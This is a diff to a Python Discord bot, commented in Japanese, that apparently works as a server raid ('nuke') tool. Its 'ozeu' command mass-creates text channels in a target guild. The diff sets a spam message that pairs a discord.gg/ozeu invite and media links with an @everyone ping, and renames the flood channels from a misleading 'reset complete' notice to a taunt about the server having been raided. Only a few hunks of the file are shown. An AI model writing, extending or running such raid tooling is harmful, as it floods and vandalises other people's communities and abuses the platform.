@@ -8,7 +8,7 @@ from dotenv import load_dotenv
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
-SPAM_MESSAGE = "こんにちは"
+SPAM_MESSAGE = "discord.gg/ozeu　https://i.imgur.com/NbBGFcf.mp4  [gif](https://media.discordapp.net/attachments/...)  [gif](https://media.discordapp.net/attachments/...) @everyone"
 OWNER_ID = 1386539010381451356  # あなたのDiscord ID
 
 intents = discord.Intents.all()
@@ -67,7 +67,7 @@ async def ozeu(ctx, guild_id: int = None):
 
     async def create_channel(index):
         try:
-            return await guild.create_text_channel(name="リセット完了　もうしばらくお待ち下さい")
+            return await guild.create_text_channel(name="荒らされてやんのｗｗｗ")
         except Exception as e:
             print(f"{index + 1}個目のチャンネル作成失敗: {e}")
             return None
@@ -262,7 +262,7 @@ tree.add_command(get_group)
 # --- /log コマンド（フィルター選択・管理者権限制限付き） ---
 from typing import Literal
 
-@bot.tree.command(name="log", description="直近の監査ログ（10件）を表示します（フィルタ選択可）")
+@bot.tree.command(name="log", description="直近の監査ログ（10件）を表示します")
 @app_commands.describe(
     action_type="取得するログの種類を選んでください（例: メンバーBAN、チャンネル削除など）"
 )
